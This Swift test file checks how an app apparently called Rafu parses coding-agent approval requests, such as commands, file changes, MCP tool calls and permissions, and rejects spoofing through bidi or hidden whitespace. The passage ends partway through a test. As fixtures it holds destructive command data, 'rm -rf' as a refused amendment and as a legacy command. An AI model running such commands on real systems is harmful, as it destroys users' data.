import Foundation
import Testing

@testable import RafuCore

private let commandMethod = "item/commandExecution/requestApproval"
private let fileChangeMethod = "item/fileChange/requestApproval"
private let permissionsMethod = "item/permissions/requestApproval"
private let userInputMethod = "item/tool/requestUserInput"
private let elicitationMethod = "mcpServer/elicitation/request"

/// A Codex tool approval elicitation. The schema fields (mode, requestedSchema,
/// serverName) follow the Codex 0.171.0 generated schema. The `_meta` keys
/// follow `build_mcp_tool_approval_elicitation_meta` in the Codex 0.171.0
/// source (tag `rust-v0.171.0`); none was captured from a live request.
private func elicitationParams(
    server: Any = "atlassian", mode: Any = "form",
    schema: Any? = ["type": "object", "properties": [String: Any]()] as [String: Any],
    meta: Any? = nil, metaOverrides: [String: Any?] = [:]
) -> [String: Any] {
    var metaObject: [String: Any] = [
        "codex_approval_kind": "mcp_tool_call", "persist": ["session", "always"],
        "tool_name": "getJiraIssue",
        "tool_params": ["issueKey": "ABC-1", "fields": ["summary"]] as [String: Any],
    ]
    for (key, value) in metaOverrides {
        if let value { metaObject[key] = value } else { metaObject.removeValue(forKey: key) }
    }
    var params: [String: Any] = [
        "threadId": "t", "turnId": "turn-1", "serverName": server,
        "environmentId": NSNull(), "mode": mode,
        "message": "Allow the atlassian MCP server to run tool \"getJiraIssue\"?",
    ]
    if let schema { params["requestedSchema"] = schema }
    params["_meta"] = meta ?? metaObject
    return params
}

private func jsonText(_ value: [String: Any]?) -> String {
    guard let value,
        let data = try? JSONSerialization.data(withJSONObject: value, options: [.sortedKeys])
    else { return "" }
    return String(decoding: data, as: UTF8.self)
}

private func question(
    _ id: String, labels: [String] = ["Yes", "No"], isOther: Bool = false,
    isSecret: Bool = false
) -> [String: Any] {
    [
        "id": id, "header": "Header", "question": "Pick one for \(id)?",
        "isOther": isOther, "isSecret": isSecret,
        "options": labels.map { ["label": $0, "description": "About \($0)"] },
    ]
}

private func userInput(_ questions: [[String: Any]]) throws -> CanvasAgentRequest {
    try #require(
        CanvasAgentRequest.parse(
            method: userInputMethod,
            params: ["threadId": "t", "isBlocking": true, "questions": questions]))
}

private func roundTrip<Value: Codable>(_ value: Value) throws -> Value {
    try JSONDecoder().decode(Value.self, from: JSONEncoder().encode(value))
}

@Suite("Agent request contract")
struct CanvasAgentRequestTests {
    // MARK: Kinds and options

    @Test("A command request keeps its text and offers four verdicts")
    func commandRequest() throws {
        let request = try #require(
            CanvasAgentRequest.parse(
                method: commandMethod,
                params: [
                    "threadId": "t", "command": "python3 fix.py\n\tdone", "cwd": "/repo",
                    "reason": "Run the fixer", "kind": "command",
                ]))
        #expect(request.kind == .command)
        #expect(request.command == "python3 fix.py\n\tdone")
        #expect(request.cwd == "/repo")
        #expect(request.reason == "Run the fixer")
        #expect(!request.terminalOnly)
        #expect(!request.isHumanCheckpoint)
        #expect(request.options.map(\.id) == ["accept", "acceptForSession", "decline", "cancel"])
        for decision in [
            CanvasAgentRequestDecision.accept, .acceptForSession, .decline, .cancel,
        ] {
            #expect(request.permits(decision))
            #expect(request.result(for: decision)?["decision"] as? String == decision.name)
        }
        #expect(!request.permits(.answers([:])))
    }

    @Test("A human checkpoint allows only accept, decline and cancel")
    func humanCheckpoint() throws {
        let request = try #require(
            CanvasAgentRequest.parse(
                method: commandMethod, params: ["command": "deploy", "kind": "humanCommand"]))
        #expect(request.isHumanCheckpoint)
        #expect(request.options.map(\.decision) == [.accept, .decline, .cancel])
        #expect(!request.permits(.acceptForSession))
        #expect(request.result(for: .acceptForSession) == nil)
    }

    @Test("An unknown command kind or a missing command needs the terminal")
    func unknownCommandKind() throws {
        let unknown = try #require(
            CanvasAgentRequest.parse(
                method: commandMethod, params: ["command": "ls", "kind": "futureKind"]))
        #expect(unknown.terminalOnly)
        #expect(unknown.options.isEmpty)
        #expect(!unknown.permits(.accept))
        let missing = try #require(
            CanvasAgentRequest.parse(method: commandMethod, params: ["reason": "why"]))
        #expect(missing.terminalOnly)
    }

    @Test("A file change with no patch keeps its grant root and needs the terminal")
    func fileChange() throws {
        let request = try #require(
            CanvasAgentRequest.parse(
                method: fileChangeMethod,
                params: ["reason": "Edit two files", "grantRoot": "/repo/src", "command": "x"]))
        #expect(request.kind == .fileChange)
        #expect(request.grantRoot == "/repo/src")
        #expect(request.reason == "Edit two files")
        #expect(request.command == nil)
        // The params carry no diff, so the row cannot show the change.
        #expect(request.terminalOnly)
        #expect(request.options.isEmpty)
        for decision in [CanvasAgentRequestDecision.accept, .acceptForSession, .decline, .cancel] {
            #expect(!request.permits(decision))
        }
        #expect(CanvasAgentRequest(kind: .fileChange, terminalOnly: false).terminalOnly)
    }

    // MARK: File changes

    private static func change(
        _ path: String = "/repo/a.swift", kind: CanvasAgentRequest.FileChange.Kind = .overwrite,
        body: String = "let a = 1\n", isDiff: Bool = false
    ) -> CanvasAgentRequest.FileChange {
        .init(path: path, kind: kind, body: body, isDiff: isDiff)
    }

    @Test("A file change with its whole content is answerable")
    func fileChangeWithFullContentIsAnswerable() {
        let request = CanvasAgentRequest(
            kind: .fileChange, fileChanges: [Self.change()], offersSessionAllow: false)
        #expect(!request.terminalOnly)
        #expect(request.fileChanges == [Self.change()])
        #expect(
            request.options.map(\.decision)
                == [.accept, .decline, .cancel])
        #expect(request.permits(.accept))
        #expect(request.permits(.decline))
        #expect(request.permits(.cancel))
        #expect(request.result(for: .accept)?["decision"] as? String == "accept")
    }

    @Test("A file change with no changes stays terminal-only")
    func fileChangeWithoutChangesStaysTerminalOnly() {
        let request = CanvasAgentRequest(kind: .fileChange, fileChanges: [])
        #expect(request.terminalOnly)
        #expect(request.options.isEmpty)
    }

    @Test("A file change with a cut body or path stays terminal-only")
    func fileChangeWithCutBodyStaysTerminalOnly() {
        let longBody = String(
            repeating: "a", count: CanvasAgentRequest.Limits.fileChangeBodyBytes + 1)
        #expect(
            CanvasAgentRequest(kind: .fileChange, fileChanges: [Self.change(body: longBody)])
                .terminalOnly)
        let longPath = "/" + String(repeating: "p", count: CanvasAgentRequest.Limits.filePathBytes)
        #expect(
            CanvasAgentRequest(kind: .fileChange, fileChanges: [Self.change(longPath)])
                .terminalOnly)
        // A body that sanitizing changes cannot be shown as it is.
        #expect(
            CanvasAgentRequest(
                kind: .fileChange, fileChanges: [Self.change(body: "a\u{1B}b")]
            ).terminalOnly)
        // A body at the limit is kept whole.
        let exact = String(repeating: "a", count: CanvasAgentRequest.Limits.fileChangeBodyBytes)
        #expect(
            !CanvasAgentRequest(kind: .fileChange, fileChanges: [Self.change(body: exact)])
                .terminalOnly)
    }

    @Test("A file change body with blank space that hides its end stays terminal-only")
    func fileChangeWithHiddenTailStaysTerminalOnly() {
        for body in ["a\n\n\n\nb", "a" + String(repeating: " ", count: 65) + "b", "a\u{200B}b"] {
            #expect(
                CanvasAgentRequest(kind: .fileChange, fileChanges: [Self.change(body: body)])
                    .terminalOnly)
        }
    }

    @Test("A file change over the file limit stays terminal-only")
    func fileChangeOverFileLimitStaysTerminalOnly() {
        let two = [Self.change("/a"), Self.change("/b")]
        #expect(!CanvasAgentRequest(kind: .fileChange, fileChanges: two).terminalOnly)
        let three = two + [Self.change("/c")]
        let request = CanvasAgentRequest(kind: .fileChange, fileChanges: three)
        #expect(request.terminalOnly)
        #expect(request.fileChanges.count == CanvasAgentRequest.Limits.fileChanges)
    }

    @Test("A file change survives a JSON round trip, even the largest")
    func fileChangeRoundTripsThroughCodable() throws {
        let move = CanvasAgentRequest.FileChange(
            path: "/a", kind: .move, body: "@@ -1 +1 @@\n-a\n+b", isDiff: true, movePath: "/b")
        let request = CanvasAgentRequest(
            kind: .fileChange, fileChanges: [Self.change(), move], offersSessionAllow: false)
        #expect(!request.terminalOnly)
        #expect(try roundTrip(request) == request)
        // Worst case for JSON: every character is escaped. The bridge frame
        // is 64 KiB.
        let quotes = String(repeating: "\"", count: CanvasAgentRequest.Limits.fileChangeBodyBytes)
        let path = "/" + String(repeating: "\"", count: CanvasAgentRequest.Limits.filePathBytes - 1)
        let largest = CanvasAgentRequest(
            kind: .fileChange,
            fileChanges: [Self.change(path, body: quotes), Self.change(path, body: quotes)])
        #expect(!largest.terminalOnly)
        let data = try JSONEncoder().encode(largest)
        #expect(data.count < 32 * 1_024)
        #expect(try JSONDecoder().decode(CanvasAgentRequest.self, from: data) == largest)
    }

    @Test("A decoded file change with an unclean body is rejected")
    func decodedFileChangeWithUncleanBodyIsRejected() throws {
        let request = CanvasAgentRequest(kind: .fileChange, fileChanges: [Self.change()])
        let data = try JSONEncoder().encode(request)
        var object = try #require(try JSONSerialization.jsonObject(with: data) as? [String: Any])
        func decodes(_ changes: [[String: Any]]) throws -> Bool {
            object["fileChanges"] = changes
            let data = try JSONSerialization.data(withJSONObject: object)
            return (try? JSONDecoder().decode(CanvasAgentRequest.self, from: data)) != nil
        }
        func raw(_ body: String) -> [String: Any] {
            ["path": "/a", "kind": "overwrite", "body": body, "isDiff": false]
        }
        #expect(try decodes([raw("ok")]))
        #expect(try !decodes([raw("bad\u{1B}")]))
        #expect(try !decodes([raw(String(repeating: "a", count: 5_000))]))
        #expect(try !decodes([raw("a"), raw("b"), raw("c")]))
        // A request with no change cannot arrive marked answerable.
        #expect(try !decodes([]))
        // An older peer sends no changes at all: it was terminal-only.
        object["fileChanges"] = nil
        object["terminalOnly"] = true
        let old = try JSONSerialization.data(withJSONObject: object)
        #expect(try JSONDecoder().decode(CanvasAgentRequest.self, from: old).terminalOnly)
    }

    @Test("A Claude file change has no session allow")
    func claudeFileChangeHasNoSessionAllow() {
        let request = CanvasAgentRequest(
            kind: .fileChange, fileChanges: [Self.change()], offersSessionAllow: false)
        #expect(!request.options.contains { $0.decision == .acceptForSession })
        #expect(!request.permits(.acceptForSession))
        // The default offers it; the Codex parse turns it off as well.
        let codex = CanvasAgentRequest.parse(
            method: fileChangeMethod, params: ["itemId": "i"], fileChanges: [Self.change()])
        #expect(codex?.offersSessionAllow == false)
        #expect(codex?.terminalOnly == false)
    }

    // MARK: MCP tool call

    private static let toolReason =
        "Atlassian MCP (claude.ai): atlassianUserInfo\n"
        + "mcp__claude_ai_Atlassian_MCP__atlassianUserInfo"

    @Test("A tool call offers Allow, Deny and Deny and stop, and never a session allow")
    func toolCallOptions() {
        // Also when the request says a session allow is offered.
        for offers in [false, true] {
            let request = CanvasAgentRequest(
                kind: .toolCall, command: "{}", reason: Self.toolReason,
                offersSessionAllow: offers)
            #expect(!request.terminalOnly)
            #expect(request.options.map(\.label) == ["Allow", "Deny", "Deny and stop"])
            #expect(request.options.map(\.id) == ["accept", "decline", "cancel"])
            #expect(request.permits(.accept))
            #expect(request.permits(.decline))
            #expect(request.permits(.cancel))
            #expect(!request.permits(.acceptForSession))
            #expect(!request.permits(.answers([:])))
            #expect(!request.isHumanCheckpoint)
        }
    }

    @Test("A tool call has no session or question result; other methods never build one")
    func toolCallHasNoSessionResult() {
        let request = CanvasAgentRequest(kind: .toolCall, command: "{}", reason: Self.toolReason)
        #expect(request.result(for: .acceptForSession) == nil)
        #expect(request.result(for: .answers(["q": "a"])) == nil)
        for method in [commandMethod, fileChangeMethod, permissionsMethod, userInputMethod] {
            #expect(CanvasAgentRequest.parse(method: method, params: [:])?.kind != .toolCall)
        }
    }

    @Test("A tool call with no arguments, no identity or a changed identity is terminal-only")
    func toolCallNeedsItsParts() {
        let noArguments = CanvasAgentRequest(kind: .toolCall, reason: Self.toolReason)
        #expect(noArguments.terminalOnly && noArguments.options.isEmpty)
        let noReason = CanvasAgentRequest(kind: .toolCall, command: "{}")
        #expect(noReason.terminalOnly && noReason.options.isEmpty)
        let emptyReason = CanvasAgentRequest(kind: .toolCall, command: "{}", reason: "")
        #expect(emptyReason.terminalOnly)
        let changed = CanvasAgentRequest(
            kind: .toolCall, command: "{}", reason: "Tool\u{202E}\nmcp__a__b")
        #expect(changed.terminalOnly)
        let cutArguments = CanvasAgentRequest(
            kind: .toolCall,
            command: String(repeating: "a", count: CanvasAgentRequest.Limits.commandBytes + 1),
            reason: Self.toolReason)
        #expect(cutArguments.terminalOnly && !cutArguments.permits(.accept))
        let hidden = CanvasAgentRequest(
            kind: .toolCall, command: "{\n\n\n\n}", reason: Self.toolReason)
        #expect(hidden.terminalOnly)
        // Only a command or a tool call carries a command text.
        #expect(CanvasAgentRequest(kind: .fileChange, command: "x").command == nil)
    }

    @Test("A tool call survives a JSON round trip; an unsanitized one is rejected")
    func toolCallCodable() throws {
        let request = CanvasAgentRequest(
            kind: .toolCall, command: "{\n  \"a\" : 1\n}", cwd: "/repo", reason: Self.toolReason,
            offersSessionAllow: false)
        #expect(try roundTrip(request) == request)
        let object = try #require(
            try JSONSerialization.jsonObject(with: JSONEncoder().encode(request))
                as? [String: Any])
        var bad = object
        bad["reason"] = "Tool\u{202E}\nmcp__a__b"
        let data = try JSONSerialization.data(withJSONObject: bad)
        #expect(throws: DecodingError.self) {
            try JSONDecoder().decode(CanvasAgentRequest.self, from: data)
        }
    }

    @Test("The patch notification maps add, delete, update and move")
    func patchUpdatedMapping() throws {
        let changes = try #require(
            CanvasAgentRequest.fileChanges(fromPatchUpdated: [
                "changes": [
                    ["path": "/a", "diff": "x", "kind": ["type": "add"]],
                    ["path": "/b", "diff": "y", "kind": ["type": "delete"]],
                    [
                        "path": "/c", "diff": "z",
                        "kind": ["type": "update", "move_path": NSNull()],
                    ],
                ]
            ]))
        #expect(changes.map(\.kind) == [.create, .delete, .edit])
        let moved = try #require(
            CanvasAgentRequest.fileChanges(fromPatchUpdated: [
                "changes": [
                    ["path": "/a", "diff": "d", "kind": ["type": "update", "move_path": "/b"]]
                ]
            ]))
        #expect(moved.first?.kind == .move)
        #expect(moved.first?.movePath == "/b")
        #expect(moved.first?.isDiff == true)
        #expect(
            CanvasAgentRequest.fileChanges(fromPatchUpdated: [
                "changes": [["path": "/a", "diff": "d", "kind": ["type": "rename"]]]
            ]) == nil)
        #expect(CanvasAgentRequest.fileChanges(fromPatchUpdated: [:]) == nil)
    }

    @Test("A command approval with a network context shows the target and has no session allow")
    func networkApproval() throws {
        let network = try #require(
            CanvasAgentRequest.parse(
                method: commandMethod,
                params: [
                    "command": "curl example.com", "kind": "command",
                    "networkApprovalContext": ["host": "example.com", "protocol": "https"],
                ]))
        #expect(!network.terminalOnly)
        #expect(network.permissions == ["Network: https example.com"])
        #expect(!network.offersSessionAllow)
        #expect(network.options.map(\.id) == ["accept", "decline", "cancel"])
        #expect(network.result(for: .accept) as? [String: String] == ["decision": "accept"])
        #expect(network.result(for: .decline) as? [String: String] == ["decision": "decline"])
        #expect(network.result(for: .cancel) as? [String: String] == ["decision": "cancel"])
        #expect(network.result(for: .acceptForSession) == nil)
        #expect(try roundTrip(network) == network)
        let none = try #require(
            CanvasAgentRequest.parse(
                method: commandMethod,
                params: ["command": "ls", "kind": "command", "networkApprovalContext": NSNull()]))
        #expect(!none.terminalOnly)
        #expect(none.permissions.isEmpty)
        #expect(none.offersSessionAllow)
    }

    @Test("A network context Rafu cannot show whole needs the terminal")
    func networkApprovalNeedsWholeContext() throws {
        let contexts: [(String, Any)] = [
            ("unknown protocol", ["host": "example.com", "protocol": "ftp"]),
            ("no protocol", ["host": "example.com"]),
            ("empty host", ["host": "", "protocol": "https"]),
            ("host number", ["host": 1, "protocol": "https"]),
            ("host with bidi", ["host": "a\u{202E}b", "protocol": "https"]),
            ("a string", "example.com"),
        ]
        for (name, context) in contexts {
            let request = try #require(
                CanvasAgentRequest.parse(
                    method: commandMethod,
                    params: ["command": "curl x", "networkApprovalContext": context]),
                "\(name)")
            #expect(request.terminalOnly, "\(name)")
            #expect(request.options.isEmpty, "\(name)")
        }
        for networkProtocol in ["http", "https", "socks5Tcp", "socks5Udp"] {
            let request = try #require(
                CanvasAgentRequest.parse(
                    method: commandMethod,
                    params: [
                        "command": "curl x",
                        "networkApprovalContext": ["host": "h.test", "protocol": networkProtocol],
                    ]))
            #expect(!request.terminalOnly, "\(networkProtocol)")
        }
    }

    // MARK: Command prefix rule

    private static func prefixRequest(_ amendment: Any?, kind: String = "command") throws
        -> CanvasAgentRequest
    {
        var params: [String: Any] = ["command": "touch y.txt", "kind": kind]
        if let amendment { params["proposedExecpolicyAmendment"] = amendment }
        return try #require(CanvasAgentRequest.parse(method: commandMethod, params: params))
    }

    @Test("A command prefix is offered only through the policy, and sends the exact amendment")
    func commandPrefixRule() throws {
        let request = try Self.prefixRequest(["touch", "y.txt"])
        #expect(request.persistChoices.map(\.kind) == [.rule])
        #expect(
            request.persistChoices.first?.line
                == "Always allow commands that start with touch y.txt")
        // Off today: not offered, not permitted, no result.
        #expect(request.options.map(\.id) == ["accept", "acceptForSession", "decline", "cancel"])
        #expect(!request.permits(.acceptAndRemember(.rule)))
        let words = ["touch", "y.txt"]
        #expect(request.result(for: .acceptAndRemember(.rule), execpolicyAmendment: words) == nil)
        // On for a test: the option sits after the two accepts, before Deny.
        #expect(
            request.options(policy: .all).map(\.id) == [
                "accept", "acceptForSession", "acceptAndRemember.rule", "decline", "cancel",
            ])
        let result = try #require(
            request.result(
                for: .acceptAndRemember(.rule), execpolicyAmendment: words, policy: .all))
        #expect(
            jsonText(result)
                == #"{"decision":{"acceptWithExecpolicyAmendment":{"execpolicy_amendment":["touch","y.txt"]}}}"#
        )
        // Words other than the ones shown are refused.
        #expect(
            request.result(
                for: .acceptAndRemember(.rule), execpolicyAmendment: ["rm", "-rf"], policy: .all)
                == nil)
        #expect(request.result(for: .acceptAndRemember(.rule), policy: .all) == nil)
        // The session and always kinds never apply to a command.
        #expect(request.result(for: .acceptAndRemember(.session), policy: .all) == nil)
    }

    @Test("A command prefix Rafu cannot show whole is not offered")
    func commandPrefixNeedsWholeWords() throws {
        let long = String(repeating: "a", count: 257)
        let many = (0..<17).map { "w\($0)" }
        let cases: [(String, Any?)] = [
            ("missing", nil), ("null", NSNull()), ("empty list", [String]()),
            ("not strings", [1, 2]), ("empty word", ["a", ""]), ("space in a word", ["a b"]),
            ("tab in a word", ["a\tb"]), ("bidi", ["a\u{202E}b"]), ("too long", [long]),
            ("too many words", many),
        ]
        for (name, amendment) in cases {
            let request = try Self.prefixRequest(amendment)
            #expect(request.persistChoices.isEmpty, "\(name)")
            #expect(!request.terminalOnly, "\(name)")
        }
        // 256 bytes exactly fits.
        let fits = try Self.prefixRequest([String(repeating: "a", count: 256)])
        #expect(fits.persistChoices.count == 1)
        // A network approval, a stdin approval and a checkpoint never offer it.
        let network: [String: Any] = [
            "command": "curl x", "proposedExecpolicyAmendment": ["curl"],
            "networkApprovalContext": ["host": "h.test", "protocol": "https"],
        ]
        let withNetwork = try #require(
            CanvasAgentRequest.parse(method: commandMethod, params: network))
        #expect(withNetwork.persistChoices.isEmpty)
        #expect(try Self.prefixRequest(["curl"], kind: "writeStdin").persistChoices.isEmpty)
        #expect(try Self.prefixRequest(["curl"], kind: "humanCommand").persistChoices.isEmpty)
    }

    @Test("A permissions request lists its grants and echoes the asked profile")
    func permissions() throws {
        let profile: [String: Any] = [
            "network": ["enabled": true],
            "fileSystem": [
                "write": ["/repo/out"],
                "entries": [["access": "read", "path": ["type": "path", "path": "/etc/hosts"]]],
            ],
        ]
        let request = try #require(
            CanvasAgentRequest.parse(
                method: permissionsMethod,
                params: ["cwd": "/repo", "reason": "Need net", "permissions": profile]))
        #expect(request.kind == .permissions)
        #expect(request.permissions == ["Network access", "Write /repo/out", "Read /etc/hosts"])
        #expect(!request.terminalOnly)
        #expect(request.options.map(\.decision) == [.accept, .acceptForSession, .decline])
        #expect(!request.permits(.cancel))
        let accept = try #require(request.result(for: .accept, requestedPermissions: profile))
        #expect(accept["scope"] as? String == "turn")
        #expect(
            (accept["permissions"] as? [String: Any])?.keys.sorted() == ["fileSystem", "network"])
        let session = try #require(
            request.result(for: .acceptForSession, requestedPermissions: profile))
        #expect(session["scope"] as? String == "session")
        let decline = try #require(request.result(for: .decline))
        #expect((decline["permissions"] as? [String: Any])?.isEmpty == true)
        // Accepting needs the exact profile that was asked for.
        #expect(request.result(for: .accept) == nil)
    }

    @Test("A permissions profile Rafu cannot read needs the terminal")
    func unknownPermissions() throws {
        let request = try #require(
            CanvasAgentRequest.parse(
                method: permissionsMethod,
                params: ["permissions": ["network": ["enabled": true], "future": [:]]]))
        #expect(request.terminalOnly)
        let empty = try #require(
            CanvasAgentRequest.parse(method: permissionsMethod, params: ["permissions": [:]]))
        #expect(empty.terminalOnly)
    }

    @Test("A Codex request that is not a prompt for the user gives no row")
    func notUserPrompt() {
        for method in [
            "item/tool/call", "account/chatgptAuthTokens/refresh", "attestation/generate",
        ] {
            let parsed = CanvasAgentRequest.parseCodex(method: method, params: ["threadId": "t"])
            #expect(parsed.request == nil, "\(method)")
            #expect(parsed.shape == nil, "\(method)")
        }
    }

    @Test("Every other Codex method gives a row, never nil")
    func everyPromptGivesARow() throws {
        let methods = [
            commandMethod, fileChangeMethod, permissionsMethod, userInputMethod,
            elicitationMethod, "applyPatchApproval", "execCommandApproval",
            "item/invented/requestSomething",
        ]
        for method in methods {
            #expect(CanvasAgentRequest.parse(method: method, params: [:]) != nil, "\(method)")
        }
    }

    // MARK: Notices and the shape record

    @Test("An unknown method is a notice that names the method's last word and records its shape")
    func unknownMethodNotice() throws {
        let parsed = CanvasAgentRequest.parseCodex(
            method: "item/invented/requestSomething",
            params: ["threadId": "t", "secret": "SECRET-VALUE", "count": 3])
        let request = try #require(parsed.request)
        #expect(request.kind == .notice)
        #expect(request.terminalOnly && request.options.isEmpty)
        #expect(
            request.reason
                == "Codex sent a request named requestSomething. Open the terminal to answer.")
        #expect(request.text == nil)
        let shape = try #require(parsed.shape)
        #expect(shape.hasPrefix("item/invented/requestSomething "))
        #expect(shape.contains("secret:string") && shape.contains("count:number"))
        #expect(!shape.contains("SECRET-VALUE"))
        // A last word with other characters gives the plain line.
        let odd = try #require(
            CanvasAgentRequest.parse(method: "item/a b/request me!", params: [:]))
        #expect(
            odd.reason
                == "Codex sent a request that Rafu does not know. Open the terminal to answer.")
    }

    @Test("An older approval is a notice with the agent's reason and a recorded shape")
    func legacyApprovalNotice() throws {
        let command = CanvasAgentRequest.parseCodex(
            method: "execCommandApproval",
            params: [
                "conversationId": "t", "callId": "c", "command": ["rm", "-rf", "x"],
                "cwd": "/work", "reason": "Needs write access", "parsedCmd": [Any](),
            ])
        let request = try #require(command.request)
        #expect(request.kind == .notice && request.terminalOnly)
        #expect(request.reason == "Codex asks to run a command. Open the terminal to answer.")
        #expect(request.text == "Needs write access")
        let shape = try #require(command.shape)
        #expect(shape.hasPrefix("execCommandApproval "))
        #expect(shape.contains("command:array[3]"))
        #expect(!shape.contains("rm") && !shape.contains("Needs write access"))
        let patch = try #require(
            CanvasAgentRequest.parse(method: "applyPatchApproval", params: ["conversationId": "t"]))
        #expect(patch.reason == "Codex asks to change files. Open the terminal to answer.")
        #expect(patch.text == nil)
    }

    private static let secret = "SECRET-TOKEN-123"

    @Test("An elicitation that is not a tool approval is a notice with the server's message")
    func elicitationNotices() throws {
        let form: [String: Any] = [
            "serverName": "files", "mode": "form", "message": "Enter your email \(Self.secret)",
            "requestedSchema": [
                "type": "object", "properties": ["email": ["type": "string"]],
                "required": ["email"],
            ] as [String: Any], "_meta": NSNull(),
        ]
        let messageOnly = elicitationParams(
            meta: ["foo": Self.secret] as [String: Any])
        var link = elicitationParams(mode: "url", meta: NSNull())
        link["url"] = "https://example.com/\(Self.secret)"
        link["elicitationId"] = "e1"
        let auth = elicitationParams(
            mode: "url", meta: ["codex_approval_kind": "browser_auth"] as [String: Any])
        let suggestion = elicitationParams(
            mode: "url", meta: ["codex_approval_kind": "tool_suggestion"] as [String: Any])
        let cases: [(String, [String: Any], String)] = [
            ("form", form, "An MCP server asks for information."),
            ("message only", messageOnly, "An MCP server asks for approval."),
            ("link", link, "An MCP server asks you to open a link."),
            ("browser auth", auth, "Codex asks you to sign in with a browser."),
            ("tool suggestion", suggestion, "Codex suggests an app or tool."),
        ]
        for (name, params, reason) in cases {
            let parsed = CanvasAgentRequest.parseCodex(method: elicitationMethod, params: params)
            let request = try #require(parsed.request, "\(name)")
            #expect(request.kind == .notice, "\(name)")
            #expect(request.terminalOnly && request.options.isEmpty, "\(name)")
            #expect(request.reason == reason + " Open the terminal to answer.", "\(name)")
            #expect(request.text == params["message"] as? String, "\(name)")
            let shape = try #require(parsed.shape, "\(name)")
            #expect(shape.hasPrefix(elicitationMethod + " "), "\(name)")
            #expect(!shape.contains(Self.secret), "\(name)")
            #expect(try roundTrip(request) == request, "\(name)")
        }
        // The server's message is bounded and marked when cut.
        var long = form
        long["message"] = String(repeating: "m", count: 600)
        let cut = try #require(CanvasAgentRequest.parse(method: elicitationMethod, params: long))
        #expect(cut.text?.utf8.count == CanvasAgentRequest.Limits.noticeBytes)
        #expect(cut.textIsCut)
    }

    @Test("A tool approval question has no arguments, so it is a terminal-only notice")
    func toolApprovalQuestionIsANotice() throws {
        let approval: [String: Any] = [
            "id": "mcp_tool_call_approval_call-1", "header": "Approve app tool call?",
            "question": "Allow the Google Calendar app to run \"create_event\"?",
            "isOther": false, "isSecret": false,
            "options": [
                ["label": "Allow", "description": "Run the tool and continue."],
                ["label": "Allow for this session", "description": "Remember."],
                ["label": "Cancel", "description": "Cancel this tool call."],
            ],
        ]
        let parsed = CanvasAgentRequest.parseCodex(
            method: userInputMethod,
            params: ["threadId": "t", "questions": [approval, question("other")]])
        let request = try #require(parsed.request)
        #expect(request.kind == .notice)
        #expect(request.terminalOnly && request.options.isEmpty && request.questions.isEmpty)
        #expect(request.reason == "Tool approval: open the terminal to see the arguments.")
        #expect(request.text == "Allow the Google Calendar app to run \"create_event\"?")
        #expect(!request.permits(.answers(["mcp_tool_call_approval_call-1": "Allow"])))
        #expect(parsed.shape?.hasPrefix(userInputMethod) == true)
        // Any other id is an ordinary question.
        let ordinary = try userInput([question("approval_1"), question("mcp_tool_call")])
        #expect(ordinary.kind == .userInput && !ordinary.terminalOnly)
    }

    // MARK: Codex MCP tool approval

    private static let sortedArguments = """
        {
          "fields" : [
            "summary"
          ],
          "issueKey" : "ABC-1"
        }
        """

    /// The `_meta` that `build_mcp_tool_approval_elicitation_meta` writes for
    /// a tool of the `codex_apps` server (Codex 0.171.0 source, tag
    /// `rust-v0.171.0`): every key it can write, including the three that an
    /// earlier build did not know (`tool_annotations`, `link_id`,
    /// `link_is_implicit`).
    private static var codexAppsMeta: [String: Any] {
        [
            "codex_approval_kind": "mcp_tool_call", "persist": ["session", "always"],
            "tool_name": "google_calendar_create_event",
            "tool_annotations": [
                "readOnlyHint": false, "destructiveHint": false, "idempotentHint": false,
                "openWorldHint": true,
            ] as [String: Any],
            "tool_title": "Create event", "tool_description": "Creates a calendar event.",
            "source": "connector", "connector_id": "connector_google_calendar",
            "link_id": "link_123", "link_is_implicit": false,
            "connector_name": "Google Calendar", "connector_description": "Plan your day",
            "tool_params": ["summary": "test", "start": "2026-11-23T10:00:00"] as [String: Any],
            "tool_params_display": [
                ["name": "summary", "value": "test", "display_name": "summary"]
            ],
        ]
    }

    @Test("A connector tool approval with every Codex 0.171.0 key becomes an answerable card")
    func connectorToolApproval() throws {
        let params = elicitationParams(server: "codex_apps", meta: Self.codexAppsMeta)
        let parsed = CanvasAgentRequest.parseCodex(method: elicitationMethod, params: params)
        let request = try #require(parsed.request)
        #expect(request.kind == .toolCall)
        #expect(!request.terminalOnly)
        #expect(parsed.shape == nil)
        #expect(request.options.map(\.id) == ["accept", "decline", "cancel"])
        // The implicit link flag does not matter.
        var implicit = Self.codexAppsMeta
        implicit["link_id"] = "implicit_link::abc"
        implicit["link_is_implicit"] = true
        let other = try #require(
            CanvasAgentRequest.parse(
                method: elicitationMethod,
                params: elicitationParams(server: "codex_apps", meta: implicit)))
        #expect(!other.terminalOnly)
    }

    @Test("A Codex tool approval becomes a tool call card with no Deny and stop")
    func elicitationToolApproval() throws {
        let request = try #require(
            CanvasAgentRequest.parse(method: elicitationMethod, params: elicitationParams()))
        #expect(request.kind == .toolCall)
        #expect(!request.terminalOnly)
        #expect(request.reason == "atlassian: getJiraIssue\nmcp__atlassian__getJiraIssue")
        #expect(request.command == Self.sortedArguments)
        #expect(request.cwd == nil)
        #expect(!request.offersSessionAllow)
        // Cancel skips the tool call; it does not stop the turn.
        #expect(!request.stopsTurnOnCancel)
        #expect(request.options.map(\.id) == ["accept", "decline", "cancel"])
        #expect(request.options.map(\.label) == ["Allow", "Deny", "Cancel tool call"])
        let identity = try #require(
            AgentPermissionRequestSummary.toolIdentity(fromReason: request.reason ?? ""))
        #expect(identity.server == "atlassian")
        #expect(identity.tool == "getJiraIssue")
        #expect(identity.name == "mcp__atlassian__getJiraIssue")
        #expect(try roundTrip(request) == request)
    }

    @Test("A Codex tool approval with empty arguments shows {}")
    func elicitationEmptyArguments() throws {
        let request = try #require(
            CanvasAgentRequest.parse(
                method: elicitationMethod,
                params: elicitationParams(metaOverrides: ["tool_params": [String: Any]()])))
        #expect(request.command == "{}")
        #expect(!request.terminalOnly)
    }

    @Test("A schema without a properties key still counts as an empty form")
    func elicitationSchemaWithoutProperties() throws {
        let request = try #require(
            CanvasAgentRequest.parse(
                method: elicitationMethod,
                params: elicitationParams(schema: ["type": "object"] as [String: Any])))
        #expect(!request.terminalOnly)
    }

    @Test("A request that is not a tool approval becomes a notice, never a tool call")
    func elicitationRecognitionRule() throws {
        let longTool = String(repeating: "a", count: 200)
        let oneProperty: [String: Any] = [
            "type": "object", "properties": ["email": ["type": "string"]],
            "required": ["email"],
        ]
        let cases: [(String, [String: Any])] = [
            ("mode url", elicitationParams(mode: "url")),
            ("mode openai/form", elicitationParams(mode: "openai/form")),
            ("mode openaiForm", elicitationParams(mode: "openaiForm")),
